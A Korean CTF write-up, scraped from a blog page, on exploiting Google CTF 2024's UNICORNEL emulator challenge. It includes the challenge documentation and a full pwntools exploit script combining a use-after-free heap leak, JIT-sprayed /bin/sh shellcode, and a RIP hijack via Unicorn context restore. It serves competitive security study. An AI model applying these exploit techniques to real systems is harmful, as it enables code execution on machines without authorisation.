fd가 릭되며 쓰레드 힙 주소를 릭할 수 있다.\n# pid 1 code = '' code += 'mov rsp, 0x2000\\n' code += 'retry:\\n' code += create_shared_x86(0x1000) code += resume_x86(0) code += pause_x86() code += map_shared_x86(0x5000, 0x1000, 0) # handle 0 code += '''\\ mov rdi, 0x5000 mov rax, [rdi] cmp rax, 0 jne success ''' 그리고 위와 같이 따로 판별 로직을 추가해서 race의 성공, 실패 여부를 판별하고 이를 통해 안정적으로 메모리를 유출할 수 있다.\n위와 같은 메모리 레이아웃을 가지는데, 여기서 rwx로 매핑된 JIT page를 발견할 수 있었고, 이러한 JIT page는 자체적인 랜덤화가 적용된 것으로 보이며 성공적인 RCE를 위해서 JIT page를 타겟팅하기로 결정했다.\nInitial Attempt 처음 시도했던 시나리오는 다음과 같다. 쓰레드 힙에서의 UAF를 통해 쓰레드 힙 주소를 유출했을때 JIT page는 엔트로피가 생각보다 적어 정확한 base를 유출할 수는 없지만 rwx 페이지 자체를 확률적으로 구할 수 있다. 이 방법으로 공격을 시도하려면 UAF를 통해 fd를 조작하고 tache에서 AAW를 달성해 JIT page에 청크를 할당해 악의적인 쉘코드를 작성하는 방식으로 공격을 시도해야한다. 사용자가 메모리를 마음대로 할당만 가능하다면, 후속 할당은 free된 메모리의 일부가 reclaim 되는 방식으로 메모리가 할당되기 때문에 fd를 변조하여 연결리스트를 오염시킬 수 있다.\n위 시나리오는 사용자가 마음대로 메모리를 할당할 수 있어야만 가능한 시나리오였고 일반적인 방법으로는 메모리를 두 번이상 연속적으로 할당이 불가능했다.\nFinal Exploit Scenario 그래서 다른 시나리오를 생각해보기로 했다. 다음과 같은 가설을 세웠다.\nJIT page가 있다는 것은 내부적인 최적화를 통해 에뮬레이션하는 코드 일부가 JIT을 통해 기계어로 변환된다는 얘기다. 이러한 JIT compile이 트리거되는 조건은 정확히 모르지만, 일반적으로 call count 같이 연속적으로 같은 코드를 실행시켜 이러한 JIT compile을 트리거할 수 있을 것이라고 생각했다. 이를 통해 유저의 입력을 JIT에 반영시킬 수 있게 만들 수 있을 것이라고 생각했고, 특정 아키텍처에서 지원하는 상수 로드를 명령을 이용해서 쉘 코드를 rwx에 일부 삽입하고 rip를 하이재킹한다면 쉘을 띄울 수 있을 것이라고 생각했다.\nx86_code = write_x86(0x3000, 0x20) x86_code += resume_x86(2) x86_code += '''\\ mov rdi, 0x200 call go go: movq r10, 0xdeadbeefdeadbeef movq r10, 0xdeadbeefdeadbeef sub rdi, 1 cmp rdi, 0 je out jmp go out: ret ''' 위 방식으로 코드를 일부러 최적화시켰더니 일종의 dead code elimination 같은 최적화를 내부적으로 진행하는 것으로 보였다. 가장 마지막 r10에 대한 대입 코드가 기계어로 변환되었고 0xdeadbeefdeadbeef가 JIT page에 들어간 것을 확인했다. 다른 아키텍처에선 최적화가 진행되었을때 JIT page에 8바이트를 반영시킬 수 없어서 x86_64에서 최적화를 시켜야한다.\n이 시나리오를 이용하기 위해서는 다음과 같은 전제 조건이 만족되어야한다.\nJIT base를 정확하게 계산할 수 있어야한다. - 즉 JIT page를 정확하게 leak 할 수 있는 primitive가 필요하다. RIP hijacking primitive가 필요하다. JIT base leak 쓰레드 힙에서 특정 사이즈를 충족시켜 이미 free 된 메모리에서 JIT을 가리키는 청크를 reclaim 할 수 있다면 성공적인 leak primitive를 만들 수 있다. 특정 컨디션에서 성공적으로 JIT base + 0x720을 릭할 수 있었다.\nHijacking RIP 유저가 컨트롤 가능한 방식에서 추가적인 악용 가능한 포인트를 찾아야 했다. 무조건 메모리 취약점이 발생한 쓰레드 내에서의 할당이 있어야 그 객체를 타겟으로 조작을 진행할 수 있기 때문이다. 가장 매력적인 포인트는 에뮬레이팅된 시스템콜 인터페이스이다.\n시스템 콜 인터페이스 내부 unicorn engine의 구현중 uc_context_restore 에서 객체가 오염되었을 때 악용가능한 포인트를 찾을 수 있었다. context save 과정에서 동적으로 길이가 결정된다. 여기서 a1 + 384는 main heap에서 할당된 unicorn 엔진의 객체이다. 근데 여기서 a2는 보다시피 취약점이 발생한 쓰레드 힙이다.\n그렇다면 공격 면적을 좀 더 넓힐 수 있다. 단순히 쓰레드 힙의 내부 객체를 조작함으로써 메인 힙에서 오버플로우를 발생시킬 수 있고 이를 통해 메인 힙의 객체를 오염시킬 수 있게 되었다. cpu_exec_x86_64 내부에선 다음과 같이 함수 포인터를 호출하기에 특정 조건을 맞춰서 객체를 조작하면 위와 같이 RIP를 하이재킹 할 수 있었다.\nExploit code from pwn import * from keystone import * import os UC_ARCH_ARM = 1 UC_ARCH_ARM64 = 2 UC_ARCH_MIPS = 3 UC_ARCH_X86 = 4 UC_ARCH_PPC = 5 UC_ARCH_SPARC = 6 UC_ARCH_M68K = 7 UC_ARCH_RISCV = 8 UC_ARCH_S390X = 9 UC_ARCH_TRICORE = 10 UC_ARCH_MAX = 11 UC_MODE_16 = 1 \u003c\u003c 1 UC_MODE_32 = 1 \u003c\u003c 2 UC_MODE_64 = 1 \u003c\u003c 3 UC_MODE_ARM = 0 UC_MODE_BIG_ENDIAN = 1 \u003c\u003c 30 def asm_x86_64(assembly_code): ks = Ks(KS_ARCH_X86, KS_MODE_64) encoding, count = ks.asm(assembly_code) return b''.join(bytes([b]) for b in encoding) def asm_aarch64(assembly_code): ks = Ks(KS_ARCH_ARM64, KS_MODE_LITTLE_ENDIAN) encoding, count = ks.asm(assembly_code) return b''.join(bytes([b]) for b in encoding) def asm_arm(assembly_code): ks = Ks(KS_ARCH_ARM, KS_MODE_ARM) encoding, count = ks.asm(assembly_code) return b''.join(bytes([b]) for b in encoding) def SEND_ELF(ARCH, MODE, code_length): payload = b'' payload += p32(ARCH) payload += p32(MODE) payload += p64(0x1000) + p64(0x1000) payload += p64(0x2000) + p64(0x1000) payload += p64(0x3000) + p64(0x1000) payload += p64(0x4000) + p64(0x1000) payload += p16(code_length) payload += p8(4) payload += p8(0) * 5 p.send(payload) unicornel_exit = 0 unicornel_write = 1 print_integer = 2 create_shared = 3 map_shared = 4 unmap_shared = 5 bookmark = 6 unicornel_rewind = 7 switch_arch = 8 unicornel_pause = 9 unicornel_resume = 10 def write_x86(addr, count): payload = f'''\\ mov rax, {unicornel_write} mov rbx, {addr} mov rcx, {count} int 0x80 ''' return payload def print_str_x86(string): payload = shellcraft.pushstr(string) + f'''\\ mov rax, {unicornel_write} mov rbx, rsp mov rcx, {len(string)} int 0x80 ''' return payload def pause_x86(): payload = f'''\\ mov rax, {unicornel_pause} int 0x80 ''' return payload def print_return_value_x86(): payload = f'''\\ mov rbx, rax mov rax, {print_integer} int 0x80 ''' return payload def create_shared_x86(length): payload = f'''\\ mov rax, {create_shared} mov rbx, {length} int 0x80 ''' return payload def map_shared_x86(address, length, handle): payload = f'''\\ mov rax, {map_shared} mov rbx, {address} mov rcx, {length} mov rdx, {handle} int 0x80 ''' return payload def unmap_shared_x86(): payload = f'''\\ mov rax, {unmap_shared} int 0x80 ''' return payload def resume_x86(pid): payload = f'''\\ mov rbx, {pid} mov rax, {unicornel_resume} int 0x80 ''' return payload def rewind_x86(): payload = f''' mov rax, {unicornel_rewind} int 0x80 ''' return payload def save_ctx_x86(): payload = f''' mov rax, {bookmark} int 0x80 ''' return payload def pause_aarch64(): payload = f''' mov x0, #{unicornel_pause} svc 0 ''' return payload def resume_aarch64(pid): payload = f''' mov x1, #{pid} mov x0, #{unicornel_resume} svc 0 ''' return payload def save_ctx_aarch64(): payload = f''' mov x0, #{bookmark} svc 0 ''' return payload def map_shared_aarch64(address, length, handle): payload = f''' mov x0, #{map_shared} mov x1, #{address} mov x2, #{length} mov x3, #{handle} svc 0 ''' return payload def print_return_value_aarch64(): payload = f''' mov x1, x0 mov x0, #{print_integer} svc 0 ''' return payload def rewind_aarch64(): payload = f''' mov x0, #{unicornel_rewind} svc 0 ''' return payload def pause_arm(): payload = f''' mov r0, #{unicornel_pause} svc 0 ''' return payload def rewind_arm(): payload = f''' mov r0, #{unicornel_rewind} svc 0 ''' return payload def print_return_value_arm(): payload = f''' mov r1, r0 mov r0, {print_integer} svc 0 ''' return payload def save_ctx_arm(): payload = f''' mov r0, #{bookmark} svc 0 ''' return payload def resume_arm(pid): payload = f''' mov r0, #{unicornel_resume} mov r1, #{pid} svc 0 ''' return payload def map_shared_arm(address, length, handle): payload = f''' mov r0, #{map_shared} mov r1, #{address} mov r2, #{length} mov r3, #{handle} svc 0 ''' return payload while True: REMOTE = True if REMOTE: p = remote('unicornel.2024.ctfcompetition.com', 1337) p.recvuntil(b'You can run the solver with:\\n') cmd = \"bash -c '\" + (p.recvline()[4:]).decode() + \"'\" result = (os.popen(cmd).read()) p.sendline(result.split ()[0]) log.success(\"POW finished\") else: p = process('./chal') context.binary = ELF('./chal') # pid 0 code = '' code += 'mov sp, #0x2000\\n' code += save_ctx_aarch64() code += pause_aarch64() code += map_shared_aarch64(0x5000, 0x5000, 0) code += resume_aarch64(1) code += rewind_aarch64() payload = asm_aarch64(code) SEND_ELF(UC_ARCH_ARM64, UC_MODE_ARM, len(payload)) p.send(payload) p.recvuntil(b'with pid ') pid = int(p.recvline()[:-1]) log.success(f\"created process - {pid}\") # pid 1 code = '' code += 'mov rsp, 0x2000\\n' code += 'retry:\\n' code += create_shared_x86(0x000000000005000) code += resume_x86(0) code += pause_x86() code += map_shared_x86(0x5000, 0x5000, 0) # handle 0 code += '''\\ mov rdi, 0x5000 mov rax, [rdi] cmp rax, 0 jne success ''' code += unmap_shared_x86() code += 'jmp retry\\n' code += 'success:\\n' code += write_x86(0x5000, 0x40) code += write_x86(0x5000, 0x10) code += pause_x86() # exploit phase 2 aaw code += 'jmp 0x7000\\n' # shared memory - shellcode start # maybe RVA? 0x7000 not working payload = asm_x86_64(code) SEND_ELF(UC_ARCH_X86, UC_MODE_64, len(payload)) p.send(payload) p.recvuntil(b'with pid ') pid = int(p.recvline()[:-1]) log.success(f\"created process - {pid}\") rv = p.recv(0x40) leak = u64(rv[:8]) thread_heap = u64(rv[16:24]) log.success(\"thread heap: \" + hex(thread_heap)) JIT = leak - 0x720 heap_leak = u64(rv[0x10:0x18]) + 0x1e820 if JIT \u003c 0: continue log.success(\"JIT: \"+hex(JIT)) log.success(\"heap target: \"+hex(heap_leak)) rv = p.recv(0x10) leak = u64(rv[:8]) if leak-0x720 != JIT: # leak + 0x720 continue # pid 2 x86_code = write_x86(0x3000, 0x20) # shellcode = [] # shellcode.append(u64(asm('''\\ # push 0x68732f # pop rax # jmp $+0x8 # ''').ljust(8,b'\\x00'))) # shellcode.append(u64(asm('''\\ # push 0x6e69622f # pop rdx # jmp $+0x8 # ''').ljust(8,b'\\x00'))) # shellcode.append(u64(asm('''\\ # shl rax,0x20 # xor esi,esi # jmp $+0x8 # ''').ljust(8,b'\\x00'))) # shellcode.append(u64(asm('''\\ # add rax,rdx # xor edx,edx # push rax # jmp $+0x8 # ''').ljust(8,b'\\x00'))) # shellcode.append(u64(asm('''\\ # mov rdi,rsp # push 0x3b # pop rax # syscall # ''').ljust(8,b'\\x00'))) shellcode = [498588942530195304, 498591614015516520, 498762874620002632, 498581047463641416, 364607107060173128] print(shellcode) x86_code += f'''\\ movq r9, 0xcafebabecafebabe movq r10, {hex(shellcode[0])} movq r11, {hex(shellcode[1])} movq r12, {hex(shellcode[2])} movq r13, {hex(shellcode[3])} movq r14, {hex(shellcode[4])} ''' x86_code += save_ctx_x86() x86_code += resume_x86(2) # go x86_code += pause_x86() x86_code += rewind_x86() x86_payload = asm_x86_64(x86_code) x86_payload = x86_payload.ljust((len(x86_code)//4 + 1)*4, b'\\x00') stub = 'mov r0, 0x8000\\n' for i in range(len(x86_code)//4): stub += f'ldr r1, = {u32(x86_payload[4*i:4*i+4])}\\n' stub += f'str r1, [r0]\\n' stub += f'add r0, r0, #4\\n' code = '' code += 'mov sp, #0x2000\\n' code += map_shared_arm(0x5000, 0x5000, 0) code += print_return_value_arm() code += stub code += resume_arm(1) code += pause_arm() # go target target = heap_leak - 0x2c0 + 0x8 target1 = heap_leak - 0x90 + 0x10 jump = JIT + 0xddb code += f'''\\ ldr r1, = {0x3000} ldr r0, = {0x5190} str r1, [r0] // size overwrite ldr r0, = {0x51a0 + 8} ldr r1, = {target1 \u0026 0xffffffff} ldr r2, = {target1 \u003e\u003e 32} str r1, [r0] add r0, r0, #4 str r2, [r0] ldr r0, = {0x51a0 + 0x10} ldr r1, = {jump \u0026 0xffffffff} ldr r2, = {jump \u003e\u003e 32} str r1, [r0] add r0, r0, #4 str r2, [r0] ldr r0, = {0x51a0 + 0x1b38} ldr r1, = {target \u0026 0xffffffff} ldr r2, = {target \u003e\u003e 32} str r1, [r0] add r0, r0, #4 str r2, [r0] ''' code += resume_arm(1) ''' 0x559c69a119a8 4c89ef mov rdi, r13 -\u003e 0x559c69a119ab 488b80c0020000 mov rax, QWORD PTR [rax + 0x2c0] 0x559c69a119b2 ff9090000000 call QWORD PTR [rax + 0x90] 0x559c69a119b8 4989c4 mov r12, rax 0x559c69a119bb 488b83a8810000 mov rax, QWORD PTR [rbx + 0x81a8] 0x559c69a119c2 4d89e7 mov r15, r12 ''' payload = asm_arm(code) SEND_ELF(UC_ARCH_ARM, UC_MODE_ARM, len(payload)) pause() p.send(payload) try: p.recvuntil(b'with pid ') pid = int(p.recvline()[:-1]) log.success(f\"created process - {pid}\") sleep(1) p.sendline(b'id') p.sendline(b'id') p.sendline(b'cat flag*') if b'uid' in p.recvuntil(b'uid', timeout=2): p.interactive() break except Exception as e: print(e) pass it += 1 p.close() ",
  "wordCount" : "4439",
  "inLanguage": "en",
  "datePublished": "2024-06-25T00:00:00Z",
  "dateModified": "2024-06-25T00:00:00Z",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://msh1307.kr/blog/google_ctf_2024_unicornel/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "msh1307",
    "logo": {
      "@type": "ImageObject",
      "url": "https://msh1307.kr/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header sticky-header">
    
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-BR89V2WEC0"></script>
    <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());
    gtag('config', 'G-BR89V2WEC0');
    </script>
    <nav class="nav">
        <div class="logo">
            <a href="https://msh1307.kr" accesskey="h" title="msh1307 (Alt + H)">msh1307</a>
            <span class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </span>
        </div>
        <ul id="menu">
            <li>
                <a href="https://msh1307.kr/" title="Home">
                    <span>Home</span>
                </a>
            </li>
            <li>
                <a href="https://msh1307.kr/blog" title="Blog">
                    <span>Blog</span>
                </a>
            </li>
            <li>
                <a href="https://msh1307.kr/about" title="About">
                    <span>About</span>
                </a>
            </li>
            <li>
                <a href="https://msh1307.kr/search" title="Search (Alt &#43; /)" accesskey=/>
                    <span>Search</span>
                </a>
            </li>
            <li>
                <a href="https://msh1307.kr/categories" title="Categories">
                    <span>Categories</span>
                </a>
            </li>
            <li>
                <a href="https://msh1307.kr/tags" title="Tags">
                    <span>Tags</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://msh1307.kr">Home</a>&nbsp;»&nbsp;<a href="https://msh1307.kr/blog/">Blogs</a></div>
    <h1 class="post-title">
      Google CTF 2024 - UNICORNEL
    </h1>
    <div class="post-meta">


June 2024

</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">‎ Table of Contents</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#unicornel" aria-label="UNICORNEL">UNICORNEL</a><ul>
                        
                <li>
                    <a href="#analysis" aria-label="Analysis">Analysis</a><ul>
                        
                <li>
                    <a href="#vulnerability" aria-label="Vulnerability">Vulnerability</a></li></ul>
                </li>
                <li>
                    <a href="#exploit" aria-label="Exploit">Exploit</a><ul>
                        
                <li>
                    <a href="#initial-attempt" aria-label="Initial Attempt">Initial Attempt</a></li>
                <li>
                    <a href="#final-exploit-scenario" aria-label="Final Exploit Scenario">Final Exploit Scenario</a></li>
                <li>
                    <a href="#jit-base-leak" aria-label="JIT base leak">JIT base leak</a></li>
                <li>
                    <a href="#hijacking-rip" aria-label="Hijacking RIP">Hijacking RIP</a></li></ul>
                </li>
                <li>
                    <a href="#exploit-code" aria-label="Exploit code">Exploit code</a>
                </li>
            </ul>
            </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><h1 id="unicornel">UNICORNEL<a hidden class="anchor" aria-hidden="true" href="#unicornel">#</a></h1>
<p>Cold Fusion 연합팀으로 Google ctf에 참여했다.
늦잠자서 늦게 합류했는데, 이미 팀원분이 취약점을 찾아놓으셔서 어떻게 악용할지를 중점적으로 생각하고 익스플로잇을 작성해서 챌린지를 해결했다.</p>
<h2 id="analysis">Analysis<a hidden class="anchor" aria-hidden="true" href="#analysis">#</a></h2>
<pre tabindex="0"><code>==== About ====
Unicornel is a multi-process, multi-architecture emulator server
with concurrency and system call support. All processes of any architecture
share the underlying kernel, and can interact with each other via
system calls and in particular a lightweight shared memory interface.

==== Starting processes ====
In order to start a new process, you must first send a unicornelf header,
which naturally bears no resemblance whatsoever to the actual ELF standard:
struct unicornelf {
    uc_arch arch; //Desired unicorn-supported ISA
    uc_mode mode; //Desired unicorn-supported mode
    struct {
        unsigned long va; //Virtual address to map
        unsigned long length; //Length of memory to map
    } maps[4]; //Up to 4 mappings supported
    unsigned short code_length; //The length of the code to follow the unicornelf header
    unsigned char num_maps; //The number of mappings initialized in the maps array
};
Following the unicornelf header should be &lt;code length&gt; bytes of assembled machine code
in the specified instruction set architecture.

NOTE: Any feedback about the unicornelf format should be submitted to:
https://docs.google.com/forms/d/e/1FAIpQLSck2N2w5J84iu7CKYlGkEmwn1Xsjtl5Jmlm_4t2DfC8vwNLOw/viewform?usp=sharing&amp;resourcekey=0--aU-tRVYI9eI9UCRMuEMfQ

There MUST be at least one mapping specified - the first mapping ALWAYS stores the
uploaded machine code. Any unused maps array elements can be set to whatever values you want, and unicornelf will dutifully ignore them.

After receiving the unicornelf and &lt;code length&gt; bytes of machine code, the &#34;process&#34; will
be automatically started on a new POSIX thread. The lowest available pid is assigned to the process. Bear in mind that this pid is utterly unrelated to the actual Linux tid of the 
thread.

==== Process Limitations ====
There can only be up to 8 processes at a time.
There can only be one process per architecture at a time. (e.g. you cannot have two x86 processes)

==== Process lifetime ====
Processes execute until one of the following conditions:
 - The exit syscall is called by the process
 - The process executes the last instruction in the uploaded assembly code
 - The process encounters some exception condition
 - The client connection to the Unicornel is terminated (all processes
   unceremoniously terminate)

==== System Call conventions ====
The system call interface is invoked whenever an interrupt is generated by the uploaded
and executing machine code. System call arguments are passed in on all architectures via
registers. The system call number is always arg0 (e.g. rax on x86).
The remaining 3 arguments are used to pass whatever data is needed to the syscall.

The register to arguments mappings for all architectures is defined by the call_regs array. Each element index of the inner per-architecture array element corresponds to the given argument index:
static unsigned int call_regs[UC_ARCH_MAX][4] = {
    {0,0,0,0}, //NONE
    {UC_ARM_REG_R0,UC_ARM_REG_R1,UC_ARM_REG_R2,UC_ARM_REG_R3}, //UC_ARCH_ARM
    {UC_ARM64_REG_X0,UC_ARM64_REG_X1,UC_ARM64_REG_X2,UC_ARM64_REG_X3}, //UC_ARCH_ARM64
    {UC_MIPS_REG_A0,UC_MIPS_REG_A1,UC_MIPS_REG_A2,UC_MIPS_REG_A3}, //UC_ARCH_MIPS
    {UC_X86_REG_RAX,UC_X86_REG_RBX,UC_X86_REG_RCX,UC_X86_REG_RDX}, //UC_ARCH_X86
    {UC_PPC_REG_0,UC_PPC_REG_1,UC_PPC_REG_2,UC_PPC_REG_3}, //UC_ARCH_PPC
    {UC_SPARC_REG_O0,UC_SPARC_REG_O1,UC_SPARC_REG_O2,UC_SPARC_REG_O3}, //UC_ARCH_SPARC
    {UC_M68K_REG_D0,UC_M68K_REG_D1,UC_M68K_REG_D2,UC_M68K_REG_D3}, //UC_ARCH_M68K
    {UC_RISCV_REG_A0,UC_RISCV_REG_A1,UC_RISCV_REG_A2,UC_RISCV_REG_A3}, //UC_ARCH_RISCV
    {UC_S390X_REG_R0,UC_S390X_REG_R1,UC_S390X_REG_R2,UC_S390X_REG_R3}, //UC_ARCH_S390X
    {UC_TRICORE_REG_D0,UC_TRICORE_REG_D1,UC_TRICORE_REG_D2,UC_TRICORE_REG_D3}, //UC_ARCH_TRICORE
};

E.g. for an X86 process to call unicornel_write, you would set rax to 1 (the unicornel write syscall number), rbx to the location of the buffer to write, and rcx to the number of bytes to write.

==== Supported system calls ====
There are 11 supported system calls:
    Syscall Name     #
    unicornel_exit   0
    unicornel_write  1
    print_integer    2
    create_shared    3
    map_shared       4
    unmap_shared     5
    bookmark         6
    unicornel_rewind 7
    switch_arch      8
    unicornel_pause  9
    unicornel_resume 10

void unicornel_exit();
  Terminates the calling process
  This function never returns

long unicornel_write(void* buf, size_t count);
  Write up to count bytes from the buffer at buf to the unicornel client (eventually sent over the socket).
  Returns the number of bytes written, or an error code if there was a failure.

void-ish print_integer(long integer);
  Write the argument as an ASCII base-10 integer to the unicornel client.
  Always returns 0.

long create_shared(unsigned long length);
  Creates a new shared memory buffer of the specified length
  Returns a handle to the buffer to be used with map_shared later, or an error code.

long map_shared(void* addr,unsigned long length, unsigned long handle);
  Map a shared buffer previously created with create_shared at the address addr.
  Lengths less than the size of the shared buffer are ok.
  Returns 0 on success, or an error code.
  NOTE:
  A process can only have one shared buffer mapped at a time, but multiple processes can map the same shared buffer at the same time.

long unmap_shared();
  Unmaps a previously mapped shared buffer
  Returns 0 on success or an error code
  WARNING:
  If this was the last mapping of the shared buffer, the shared buffer will be destroyed
  and the handle released to be used for new created shared buffers

long bookmark();
  Bookmark the current processor state to return to later with rewind().
  Returns 0 on success or an error code.
  NOTE:
  You can only have one bookmark at a time.
  Once a bookmark is created, it cannot be destroyed or reset except by
  switching architectures. You can rewind to the same bookmark multiple times.

long unicornel_rewind();
  Rewind the processor to the state previously saved by bookmark().
  Returns 0 on success or an error code.
  NOTE:
  This does not rewind writes to memory, but will rewind (and unmap) shared
  buffers that were mapped since the bookmark&#39;d processor state.
  WARNING:
  While shared buffer mappings can be rewound, shared buffer *unmappings* cannot be in order
  to avoid potential UAF issues. This feature may be added in future versions....

void switch_arch(uc_arch arch, uc_mode mode, void* new_pc);
  Switch the instruction set architecture used by this process, and long jump to new_pc
  Mappings (including shared mappings) and memory contents are preserved across the switch.
  CPU State (including registers and bookmarks) are discarded.
  Ensure any desired state to pass across the ISA barrier is saved to memory beforehand.
  This system call does not (really) &#34;return&#34;, and no return value is specified.
  NOTE:
  In order to prevent the numerous developer headaches that would otherwise result, a process 
  can only transition architectures once in its lifetime.
  WARNING:
  Any shared buffer mappings have an additional refcount &#34;zombified&#34;.
  This additional reference will be destroyed when the process exits. This means that a
  shared buffer may not be mapped anywhere, and yet still exist and be mappable. This is
  not considered a bug, but it&#39;s not really a feature either.

void-ish unicornel_pause();
  Pause the current process until another process calls unicornel_resume() with the
  appropriate pid
  This system call always succeeds, and always returns 0.

long unicornel_resume(unsigned long pid)
  Resume the process specified by pid.
  Returns 0 on success, or an error code.
</code></pre><p>처음에 Docs가 주어진다.
멀티 아키텍처, 멀티 프로세스 에뮬레이터가 주어진다.
각자의 프로세스는 병렬적으로 동작하며, IPC를 위한 shared memory가 최대 하나가 매핑될 수 있었다.
소스코드도 전체가 주어져서 분석 자체는 되게 쉽게 할 수 있었다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>argv[]) {
</span></span><span style="display:flex;"><span>  pfds[MAX_PROCESSES].fd <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span> <span style="color:#75715e">/* stdin */</span>;
</span></span><span style="display:flex;"><span>  pfds[MAX_PROCESSES].events <span style="color:#f92672">=</span> POLLIN;
</span></span><span style="display:flex;"><span>  pfds[MAX_PROCESSES].revents <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> MAX_PROCESSES; i<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>    pfds[i].fd <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    pfds[i].events <span style="color:#f92672">=</span> POLLIN;
</span></span><span style="display:flex;"><span>    pfds[i].revents <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Welcome to the unicornel!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fflush</span>(stdout);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">pthread_mutex_init</span>(<span style="color:#f92672">&amp;</span>task_lock,NULL);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span>(<span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">poll</span>(pfds,MAX_PROCESSES <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>,<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">unsigned</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> MAX_PROCESSES; i<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#75715e">//Data available from emulated process
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      <span style="color:#66d9ef">if</span>(pfds[i].revents <span style="color:#f92672">&amp;</span> POLLIN) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span> nbytes;
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">ioctl</span>(pfds[i].fd,FIONREAD,<span style="color:#f92672">&amp;</span>nbytes);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">splice</span>(pfds[i].fd,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span> <span style="color:#75715e">/* stdout */</span>,<span style="color:#ae81ff">0</span>,nbytes,<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#75715e">//Process ended, and the write end of the pipe was closed in destroy_process. Finish cleanup
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      <span style="color:#66d9ef">if</span>(pfds[i].revents <span style="color:#f92672">&amp;</span> POLLHUP) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">close</span>(pfds[i].fd);
</span></span><span style="display:flex;"><span>        pfds[i].fd <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(pfds[MAX_PROCESSES].revents <span style="color:#f92672">&amp;</span> POLLIN) {
</span></span><span style="display:flex;"><span>      <span style="color:#75715e">//Received new process data
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      <span style="color:#a6e22e">start_process</span>();
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">fflush</span>(stdout);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>단순히 커스텀 ELF 포맷을 받아서 실행해준다.</p>
